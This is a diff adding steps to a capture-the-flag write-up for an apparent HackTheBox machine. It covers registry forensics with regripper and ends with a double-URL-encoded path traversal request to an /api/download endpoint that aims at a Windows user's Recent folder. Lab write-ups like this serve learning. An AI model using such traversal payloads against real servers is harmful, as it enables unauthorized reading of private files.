@@ -209,7 +209,7 @@ python3 /opt/ghostsurf/ghostsurf.py -t http://gpz-op26-secure.ghostlink.htb -r -
 
 <figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
-**To use burp we need to configure an upstrem proxy rule  (Proxy Settings -> Network -> Connections)**&#x20;
+**To use burp we need to configure an upstrem proxy rule  (Proxy Settings -> Network -> Connections -> SOCKS proxy)**&#x20;
 
 <figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
 
@@ -254,4 +254,40 @@ i double encoded this it become like this and it work
 {% endcode %}
 
 <figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+
+[https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e](https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e)
+
+**I use this repos to search the paths on windows**
+
+<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+
+**I used reglookup to analyze the file but he has some parsing problems so we use regripper**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+regripper -r NTUSER.dat -a 
+
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.zip
+LastWrite Time 2026-05-13 01:56:02Z
+MRUListEx = 0
+  0 = db.zip
+ 
+# the most intersting part is that db.zip 
+```
+{% endcode %}
+
+**Since i dont know the path for this file i will brute force until i found it**&#x20;
+
+<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+
+**this gives internal error i dont know why  am sure am on the right path for recent files on windows**
+
+**i tried to add a .lnk**
+
+{% code overflow="wrap" %}
+```
+/api/download/%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255C%252E%252E%255CUsers%255Csvc_canary%255CAppData%255CRoaming%255CMicrosoft%255CWindows%255CRecent%255Cdb.zip.lnk
+```
+{% endcode %}
 
